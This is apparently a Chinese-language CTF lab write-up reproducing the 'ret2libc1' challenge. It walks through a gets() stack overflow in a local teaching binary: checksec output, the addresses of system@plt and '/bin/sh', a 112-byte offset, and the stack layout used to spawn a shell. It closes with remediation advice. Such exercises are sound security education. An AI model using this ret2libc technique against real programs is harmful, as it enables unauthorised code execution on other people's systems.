# ret2libc1 复现记录

本记录复现课程表格中的 `ret2libc1`：利用程序已有的 `system` 和 `/bin/sh` 字符串完成栈溢出。

配套程序：

```text
/home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1
```

这是一个本地教学二进制，只用于理解栈溢出和 ret2libc。

## 1. 程序分析

源码中的关键部分是：

```c
char *shell = "/bin/sh";

int main(void)
{
    char buf1[100];
    gets(buf1);
    return 0;
}
```

`gets` 没有长度检查，可以覆盖 `main` 的保存返回地址。程序本身已经通过 PLT 提供 `system`，因此不需要注入 shellcode，也不需要解析 libc 基址。

## 2. 防护检查

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1
chmod +x ret2libc1
file ret2libc1
checksec --file=ret2libc1
```

关键结果：

```text
ELF 32-bit LSB executable, Intel 80386
No canary found
NX enabled
No PIE (0x8048000)
Partial RELRO
```

关键地址：

| 作用 | 地址 |
| --- | --- |
| `system@plt` | `0x08048460` |
| `/bin/sh` | `0x08048720` |
| `main` | `0x08048618` |
| `gets` 目标 `buf1` | `esp + 0x1c` |

可以用以下命令复核：

```bash
nm -n ret2libc1 | rg ' system| shell| main'
strings -a -t x ret2libc1 | rg '/bin/sh'
objdump -d -Mintel ret2libc1 | sed -n '/<main>:/,/^$/p'
```

## 3. 偏移计算

向程序输入 pwntools 的 cyclic pattern 后，GDB 显示崩溃时 EIP 为 `0x62616164`：

```bash
python3 - <<'PY'
from pwn import *
print(cyclic_find(0x62616164, n=4))
PY
```

输出为：

```text
112
```

因此从 `buf1` 起始位置到保存返回地址的偏移是 112 字节。

## 4. ret2libc 栈布局

32 位 Linux 使用 cdecl 调用约定，调用 `system("/bin/sh")` 时，栈上依次需要：

```text
112 字节填充
0x08048460                system@plt，覆盖 main 返回地址
0x42424242                system 返回地址，占位
0x08048720                system 的第一个参数：/bin/sh
```

`main` 执行 `ret` 后跳到 `system@plt`。此时栈顶的下一个 4 字节被 `system` 当作返回地址，再下一个 4 字节就是它的第一个参数，因此 `system` 实际收到的是 `0x08048720`。

## 5. 复现步骤

```bash
cd /home/xyx/Desktop/ret2libc1_repro
python3 exploit.py
```

进入交互 shell 后输入：

```text
echo RET2LIBC1_OK
```

成功输出：

```text
RET2LIBC1_OK
```

也可以直接执行题库原有脚本：

```bash
cd /home/xyx/Desktop/ex2/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1
chmod +x ret2libc1
printf 'echo RET2LIBC1_OK\n' | python3 exploit.py
```

## 6. 与后续 ret2libc 题目的区别

本题同时给出了可直接使用的 `system@plt` 和 `/bin/sh`，所以只需一次返回地址覆盖。后续题目通常会移除其中一个条件，需要从 GOT、libc 泄漏或 ROP 链中恢复地址，难度会更高。

## 7. 修复建议

漏洞根源是 `gets` 的无界写入，应改用带长度限制的 `fgets`，并启用栈 canary、PIE、RELRO 和 NX。NX 不能防止 ret2libc，因为 ret2libc 复用的是已有代码；边界检查和完整的编译防护需要同时启用。
